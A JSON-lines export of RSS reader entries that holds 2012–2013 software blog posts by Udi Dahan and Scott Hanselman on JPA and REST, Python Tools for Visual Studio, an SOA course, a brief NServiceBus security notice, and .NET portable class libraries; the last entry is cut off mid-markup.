{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/2jw748SJCpg/","title":"JPA with REST, OData, and SQL","published":{"$wrap":"$date","v":1352040984000,"h":"2012-11-04T14:56:24.000Z"},"starred":false,"read":false,"content":"<p>Feeling a little bit rant-y today, as I just saw some more abuse of remote calls, this time on the Java side of things.</p><p>JPA is the Java Persistence API – a kind of ORM, as you’d expect. Luckily, a lot of the web services stuff was already on the way out by the time that <a href=\"http://wiki.eclipse.org/EclipseLink/FAQ/WhatIsDBWS\">EclipseLink DBWS</a> came out. DBWS allowed you to expose database artifacts as web services.</p><p>I mean, it’s not like we have any other interoperable ways of accessing data, right?</p><p>Anyway, like I said, that didn’t take off, but now they’re reinventing it – this time with REST!</p><p>In case you had any doubts, REST is pure awesomeness and adding it to anything else makes it awesome too. Lest anybody take this out of context (it’s happened before), I’m being sarcastic.</p><p><a href=\"http://wiki.eclipse.org/EclipseLink/Development/2.4.0/JPA-RS/REST-API#Overview\">Here it is</a>.</p><p>God knows they couldn’t let Microsoft totally dominate this area with <a href=\"http://en.wikipedia.org/wiki/Open_Data_Protocol\">OData</a> coming out quite some time ago. In case you were wondering, OData was designed to provide standard CRUD access of a data source over HTTP.</p><p>Of course, none of these support any transactions so if you actually wanted to do some meaningful business logic on top of this CRUD, you wouldn’t have any consistency. And, let’s face it, if you’re not doing any meaningful business logic, just basic persistence, you just do it. That problem’s been solved a long time ago.</p><p>Can we please stop reinventing SQL already?</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=2jw748SJCpg:cwWy_K6lMiM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=2jw748SJCpg:cwWy_K6lMiM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=2jw748SJCpg:cwWy_K6lMiM:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=2jw748SJCpg:cwWy_K6lMiM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=2jw748SJCpg:cwWy_K6lMiM:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/2jw748SJCpg\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1170}}
{"k":"0000000084","o":"0000014417","v":"001"}
{"_id":1171,"_uid":1171,"_dt":1373742620952,"_s":"8f678fb3103c38c66b6847f3e05510ea"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/42979544/0/scotthanselman~One-of-Microsofts-BestKept-Secrets-Python-Tools-for-Visual-Studio-PTVS.aspx","title":"One of Microsoft's Best-Kept Secrets - Python Tools for Visual Studio (PTVS)","published":{"$wrap":"$date","v":1372750792000,"h":"2013-07-02T07:39:52.000Z"},"starred":false,"read":false,"content":"<div><figure><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/\"><img title=\"Python Tools for VS\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Python Tools for VS\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/RgiWLj2_3.png\"width=\"1001\"height=\"532\"/></a></figure> <p>I've talked some about the sweet support for node and PHP in<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.windowsazure.com\">Azure</a>. You can also File | New | Node.js express application in<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.webmatrix.com\">WebMatrix</a>, or run WordPress and get intellisense as well.</p><blockquote><p>\"I installed windows just so i can use PTVS\" - Comment on Hacker News</p></blockquote><p>But I'm consistently shocked that folks forget about Python at Microsoft. I am a C# person, myself, but the Developer Division at Microsoft loves their languages. C++, VB, C#, F#, etc and they aren't messing about when they get serious about a language.</p><p align=\"left\">One of the least-known and most-kick-butt free products we have is PTVS -<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/\">Python Tools for Visual Studio</a>. Whether you're just interested in learning Python or you're a hardcore PhD who wants<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.youtube.com/watch?v=wvJaKQ94lBY&feature=c4-overview&list=UUpKEjPmLsl19ETchJLJj42g\">mixed-language Python and C++ debugging</a>or somewhere in between, you gotta check this out. (Seriously, the mixed-mode debugging thing can't be overstressed...)</p><h3 align=\"left\">The Misconceptions</h3><ul><li>Microsoft? Python?  Oh, it must be all about<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~ironpython.net/download/\">IronPython</a>, that's dead, right?<ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~ironpython.codeplex.com/\">IronPython</a>is a community-run project and just put an 2.7.4 alpha out last month.  PTVS fully supports IronPython, but the most advanced support is for standard CPython!</li></ul></li><li>PTVS needs VisualStudio? I don't have any money.<ul><li>PTVS, combined with the Integrated/isolated VS Shell is completely and perpetually free.  And with the advent of VS2013, they've combined them into a single installer:<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/releases\">https://pytools.codeplex.com/releases</a>(at bottom of page).</li></ul></li></ul><h3>This is Real</h3><p align=\"left\">Here's my VS2013 after installing<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com\">PyTools</a>(PTVS). I've got IronPython which is Python running under the .NET CLR, but I've also got Django apps as well as a regular CPython or making a new project from existing code.</p><p><img title=\"Python inside VS\"style=\"display: inline\"alt=\"Python inside VS\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_3.png\"width=\"800\"height=\"525\"/></p><p>You can see that PTVS knows what Python engines I have installed, and I can easily switch between them. Here you can see that VS is refreshing the auto-completion (intellisense) databases for each version.</p><p><img title=\"A list of Python Interpreters\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"A list of Python Interpreters\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_6.png\"width=\"797\"height=\"209\"/></p><p>There's also a complete REPL<em>inside</em>Visual Studio for each:</p><p><img title=\"Python REPL inside VS\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Python REPL inside VS\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_9.png\"width=\"854\"height=\"325\"/></p><h3>Developing Django Apps in Visual Studio</h3><p>Maybe you're a Django (one of Python's Web Frameworks) web developer, you can use VS to develop your app.</p><p>Go File New | Django App, then make a new Python Virtual Environment from the Solution Explorer, and watch Visual Studio freaking installed<em>pip</em>for you (the Python package manager). It's very seamless.</p><p><img title=\"Adding a Virtual Python Environment\"style=\"display: inline\"alt=\"Adding a Virtual Python Environment\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_12.png\"width=\"500\"height=\"380\"/></p><p>Which gives me this:</p><p><img title=\"Python in my VS and I'm FREAKING OUT\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Python in my VS and I'm FREAKING OUT\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_15.png\"width=\"288\"height=\"351\"/></p><p>Then I right click on\"dev\" and just like NuGet (except this is Python, so pip) I install django:</p><p><img title=\"Installing Django\"style=\"display: inline\"alt=\"Installing Django\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_18.png\"width=\"500\"height=\"215\"/></p><p>Django is massive, so this took a while, but still! And.....I've accomplished Hello World in Django. Well, Hello Django, at least, launched from Visual Studio.</p><p><img title=\"Hello Django\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Hello Django\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_21.png\"width=\"811\"height=\"535\"/></p><p>You should feel free to go and<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/wikipage?title=Django%20Web%20Site/Cloud%20Service%20Tutorial&version=7\">run through the whole Django Tutorial if you like and even deploy your app to Azure</a>! You can host Django on a regular Azure Web Site, or a Virtual Machine if you want more control.</p><p>You can even interactively debug Python running in Azure on Linux from your Visual Studio instance! Check out<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.youtube.com/watch?v=0TJ0SAJLYIU\">Steve do just that at PyCon in this YouTube video</a>.</p><blockquote><p>There's a bunch of great educational and quick start Tutorials on the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.youtube.com/channel/UCpKEjPmLsl19ETchJLJj42g?feature=watch\">Python Tools YouTube Channel</a>, they are a great resource to bookmark.</p></blockquote><p>You can attach to remote Python processes over SSL and debug if you like.</p><p><img title=\"Setting up Python Debugging\"style=\"border-left-width: 0px; border-right-width: 0px; background-image: none; border-bottom-width: 0px; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-top-width: 0px\"border=\"0\"alt=\"Setting up Python Debugging\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_24.png\"width=\"479\"height=\"179\"/></p><h4>It's Really Integrated</h4><p>Let's get real here for a second. Lots of projects plug stuff into Visual Studio. You may have made it this far into the post and be saying\"oh, wah wah, this thing sets up some batch files and some syntax highlighting and calls itself a full-featured Python IDE.\"</p><p>Um, no. This is the best of VS and the best of Python and I'm blown away. Check this out. PTVS knows that I'm doing unit testing here and<em>they've integrated Python Unit Testing with the VS Unit Testing UI.</em></p><p><img title=\"Unit Testing in Python and VS? My heart can't take it!\"style=\"display: inline\"alt=\"Unit Testing in Python and VS? My heart can't take it!\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/image_27.png\"width=\"951\"height=\"513\"/></p><p>This is debugging, remote debugging, cross language debugging, tool tips, watches, locals, call stacks, unit testing, full REPL with inline graphics, profiling, cloud publish, best of class CPython support, and so much more.</p><p><img title=\"Nailed it\"alt=\"Nailed it\"src=\"http://hanselman.com/blog/content/binary/slowclap.gif\"/></p><p>If you're into Python or knows someone who is, for reals,<strong>drink it in and get on board at</strong><a title=\"https://pytools.codeplex.com/\"href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com\"><strong>https://pytools.codeplex.com</strong></a>. Check out their samples. They've got<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/releases\">Python talking to Kinect, Python talking to Excel</a>and more. Their<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/documentation\">PTVS Documentation is really good as well</a>.</p><p>Just getting started? Well, go<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~learnpythonthehardway.org/book/\">Learn Python The Hard Way</a>.</p><h3><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/wikipage?title=PTVS%20Installation\">Installing PTVS</a></h3><p>Here's the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/wikipage?title=PTVS%20Installation\">complete install instrucitons</a>. You need VS, the PTVS, and some Python.</p><ul><!--EndFragment--></ul><ul><li>If you have no Visual Studio installed, go get the FREE PTVS that includes the Visual Studio Shell. That's<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/releases/view/103101\">\"PyToolsIntegrated\" at the middle of this page</a>. Then<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.python.org/download/\">get a copy of Python</a>.</li><li>If you already have VS 2010, VS 2012, or VS 2013, go get PTVS for your version. The VS2013 version is the best and has a lot of fixed bugs. I installed PTVS along with Python<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.python.org/download/\">3.3 for Windows</a>.</li></ul><p><img title=\"PTVS is free\"style=\"display: inline\"alt=\"PTVS is free\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/One-of-Microsofts-Best-Kept-Secrets---Py_14ADE/ptvs%20install%20pic2_2_3.png\"width=\"696\"height=\"210\"/></p><p>Finally, explore the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com\">Resources and Docs for Python Tools for Visual Studio</a>, including, but not limited to<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~pytools.codeplex.com/wikipage?title=Features%20Editor\">Editing</a>,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~pytools.codeplex.com/wikipage?title=Features%20Refactoring\">Refactoring</a>,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://pytools.codeplex.com/wikipage?title=Unit%20Tests\">Unit Tests</a>,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~pytools.codeplex.com/wikipage?title=PTVS%20Django%20Support\">Django, IPython notebook and Azure cloud computing</a>,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~pytools.codeplex.com/wikipage?title=PyKinect\">Kinect for Python</a>and<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~pytools.codeplex.com/wikipage?title=Pyvot\">Pyvot - an Excel to Python bridge</a>.</p><br><hr/>©2013 Scott Hanselman. All rights reserved.<br></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/42979544/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/42979544/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/42979544/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/42979544/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/42979544/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/42979544/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1171}}
{"k":"0000000084","o":"0000002253","v":"001"}
{"_id":1172,"_uid":1172,"_dt":1373742620952,"_s":"123f47aeb5ef551760eceef93564e2e4"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/TjRCl5ipN6M/","title":"SOA Course in NYC almost full","published":{"$wrap":"$date","v":1364489787000,"h":"2013-03-28T16:56:27.000Z"},"starred":false,"read":false,"content":"<p>So, there are just a few spots left for my course in New York on April 8.</p><p>If you want to come please don’t wait to register.</p><p>We’re also going to be re-recording the course as the recording from Denver turned out pretty bad, only this time with a much more professional crew. This means that attendees will be getting the recording of the course which they themselves attended instead of that of a previous group – an added bonus.</p><p>Just as a reminder – if your company won’t pay for the course and you still want to come, there are significant discounts available. Just send me an email to training@udidahan.com.</p><p>Hope to see you there.</p><p><a href=\"http://www.eventbee.com/v/nservicebus/event?eid=900376302\">Register here</a></p><p>* PS – After this will be <a href=\"http://www.cornerstone.se/Web/Templates/CoursePage.aspx?id=2513&course=COUR2011030713242304266086&epslanguage=SV\">Stockholm</a> and then <a href=\"https://skillsmatter.com/register-online/course/2595\">London</a> and that’ll be all folks!</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=TjRCl5ipN6M:IpFO1PyNAUo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=TjRCl5ipN6M:IpFO1PyNAUo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=TjRCl5ipN6M:IpFO1PyNAUo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=TjRCl5ipN6M:IpFO1PyNAUo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=TjRCl5ipN6M:IpFO1PyNAUo:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/TjRCl5ipN6M\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1172}}
{"k":"0000000084","o":"0000001595","v":"001"}
{"_id":1173,"_uid":1173,"_dt":1373742620953,"_s":"2d89a2e84512fed2cb002d16caf4cc36"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/ayH5RVLQR_U/","title":"NServiceBus Security Issue Found","published":{"$wrap":"$date","v":1346228924000,"h":"2012-08-29T08:28:44.000Z"},"starred":false,"read":false,"content":"<p>For anybody that is using NServiceBus that isn’t receiving messages via our public list, I wanted to let you know that we’ve uncovered a security issue. This affects systems using WireEncryptedString on types that aren’t messages themselves but are used in messages.</p><p><a href=\"http://tech.groups.yahoo.com/group/nservicebus/message/15568\">Here’s the full information</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=ayH5RVLQR_U:STftslgoWOo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=ayH5RVLQR_U:STftslgoWOo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=ayH5RVLQR_U:STftslgoWOo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=ayH5RVLQR_U:STftslgoWOo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=ayH5RVLQR_U:STftslgoWOo:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/ayH5RVLQR_U\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1173}}
{"k":"0000000084","o":"0000020119","v":"001"}
{"_id":1174,"_uid":1174,"_dt":1373742620953,"_s":"b5e0941152647825d7fd3d6633580876"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/43282970/0/scotthanselman~CrossPlatform-Portable-Class-Libraries-with-NET-are-Happening.aspx","title":"Cross-Platform Portable Class Libraries with .NET are Happening","published":{"$wrap":"$date","v":1373406754000,"h":"2013-07-09T21:52:34.000Z"},"starred":false,"read":false,"content":"<div><p><img title=\"image\"style=\"float: right; margin: 0px 0px 0px 5px; display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/edddd7571ec7_CAED/image_6.png\"width=\"385\"align=\"right\"height=\"375\">Portable Class Libraries<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/HiddenGemsInVisualStudio11BetaNETPortableClassLibraries.aspx\">are the Happy Little Feature that Could</a>. They've been chugging along, doing their thing, and it's getting to the point where they are going to pop. That's pop in a good way.</p><p>If you're not writing .NET apps for more than one target, then you likely haven't bumped into them. However for those people who are writing .NET and want it to run on everything from Watches to Phones to Tablets to Xboxen to Desktops to the Cloud, they are enjoying what PCLs can offer.</p><p>There's still a few technical and legal challenges but I'm confident they'll be dealt with and we'll be able to create great binary libraries that can be used everywhere.</p><p>There's been a bunch of recent activity in the .NET community around Portable Class Libraries and cross platform .NET.  Overall, Portable Class Libraries are starting to see wider adoption, more open source libraries are being released with portable support, and the MVVM pattern is proving to be a great way to maximize code sharing in cross platform apps.</p><h3>Portable Library Releases</h3><p>First of all, there have been a bunch of new libraries released as PCLs recently.  Three of them are from GitHub's own<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~paulbetts.org/\">Paul Betts</a>:<ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/reactiveui/ReactiveUI\">Reactive UI</a>–Reactive UI is an MVVM framework built on top of the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://rx.codeplex.com/\">Reactive Extensions</a>. <a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/reactiveui/ReactiveUI/releases/5.0.1\">Version 5.0</a>was released last week, which is\"totally Portable-Friendly\", and supports the following platforms:<ul><li>Xamarin.iOS<li>Xamarin.Android<li>Xamarin.Mac<li>.NET 4.5 (WPF)<li>Windows Phone 8<li>Windows Store Apps (WinRT)</li></ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/github/Akavache\">Akavache</a>- An asynchronous, persistent key-value store. <a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/github/Akavache/releases/3.0.1\">Version 3.0</a>, which includes PCL support, was also released last week, and now\"nearly all of your serialization and network access layer can be cross-platform.\"Akavache supports the same set of platforms as Reactive UI. This is a really amazing piece of software that deserves its own blog post. I'll do one soon.<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/xpaulbettsx/splat\">Splat</a>–\"A library to make things cross-platform that should be.\"It has cross platform APIs for images and colors, with platform-specific extension methods to go back and forth between the platform-specific native types.  This looks like an elegant solution to the problem you run into if you want a portable ViewModel but you want to expose an image in it.</li></ul><p>Next,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/scottisafool\">Scott LoveGrove</a>confessed:<blockquote><p>I might be getting a little obsessed with PCLs at the moment. #IHaveAProblem (<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/scottisafool/status/351957250711093248\">link</a>).</p></blockquote><p>Scott has released four portable libraries that help access web services:<ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~metronuggets.com/2013/06/24/introducing-the-scoreoidportable-pcl/\">Scoreoid Portable</a>- A Portable Class Library that gives developers access to the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~scoreoid.com/#/\">Scoreoid</a>scoring system.  The library provides a friendly .NET wrapper for the Scoreoid REST APIs, and uses our portable HttpClient NuGet package.<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/ScottIsAFool/FanArtPortable\">FanArt Portable</a>- A Portable Class Library that gives developers access to the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~fanart.tv/\">fanart.tv</a>film, TV, and music image resources.  It also uses portable HttpClient.<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://github.com/ScottIsAFool/CineworldPortable\">Cineworld Portable</a>- A Portable Class Library that gives developers access to the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.cineworld.co.uk/\">Cineworld</a>film and cinema listings for the UK and Ireland.  It also uses portable HttpClient.<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~metronuggets.com/2013/06/25/belatedly-introducing-livesdkhelper/\">LiveSDKHelper</a>- A helper library to more easily use the Microsoft Live SDK.  Contains strong types which the responses from the Live SDK can be deserialized into.</li></ul><p>Another new portable library release is<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://bitbucket.org/mabster/budgie/\">Budgie</a>, a library for accessing Twitter. The .NET and Azure Teams have also released a PILE of Portable Libraries.<p><b>.NET Team:</b><ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Net.Http\">HttpClient</a>- Simplified API for talking to HTTP services,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/dotnet/archive/2013/05/29/get-httpclient-rtm-200-ok.aspx\">announced here</a>.</li><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Bcl.Compression\">Microsoft.Bcl.Compression</a>- GZIP, DEFLATE& ZIP compression<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/dotnet/archive/2013/06/06/portable-compression-and-httpclient-working-together.aspx\">works great with Http</a>.</li><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Bcl.Async\">Microsoft.Bcl.Async</a>- Await/Async for<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/bclteam/archive/2013/04/17/microsoft-bcl-async-is-now-stable.aspx\">down-level platforms is ready to go</a></li><ul><li>Plus, the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Bcl\">BCL Portability Pack</a>(adds Task, IProgress&lt;T&gt;, Tuple& CallerXXXAttributes to<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/bclteam/archive/2013/04/17/microsoft-bcl-async-is-now-stable.aspx\">down-level platforms</a>)</li></ul><li>MEF 2  in<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Composition/\">Microsoft.Composition</a></li><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/bclteam/archive/2012/08/21/mef-and-tpl-dataflow-nuget-packages-for-net-framework-4-5.aspx\">TPL Dataflow</a>(Actor/Agent-based API for coordinating async pipelines) on<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Tpl.Dataflow/\">NuGet</a>as Microsoft.Tpl.Dataflow,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/bclteam/archive/2012/08/21/mef-and-tpl-dataflow-nuget-packages-for-net-framework-4-5.aspx\">announcement here</a>.</li><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Bcl.Immutable\">Immutable Collections</a>in Microsoft.Bcl.Immutable,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~nuget.org/packages/Microsoft.Bcl.Immutable\">announcement here</a></li></ul><p><b>Other teams:</b><ul><li>Azure Mobile Services has a Portable Library</li><ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://nuget.org/packages/WindowsAzure.MobileServices/\">https://nuget.org/packages/WindowsAzure.MobileServices/</a>(<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.johanlaanstra.nl/?p=217\">http://www.johanlaanstra.nl/?p=217</a>)</li></ul><li>Rx Extensions</li><ul><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.nuget.org/packages/Rx-Main/\">http://www.nuget.org/packages/Rx-Main/</a></li><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~blogs.msdn.com/b/rxteam/archive/2013/02/06/rx-2-1-is-here.aspx\">http://blogs.msdn.com/b/rxteam/archive/2013/02/06/rx-2-1-is-here.aspx</a></li></ul></ul><p>Not to mention all these excellent Portable Libraries that you should be familiar with as well.<p>MVVM<ul><li>MVVM Light Toolkit<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~mvvmlight.codeplex.com/SourceControl/network/forks/onovotny/MvvmLightPortable\">portable fork</a><li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~slodge.blogspot.com/2012/05/portable-class-libraries-in-mvvmcross.html\">MvvmCross</a><li><a 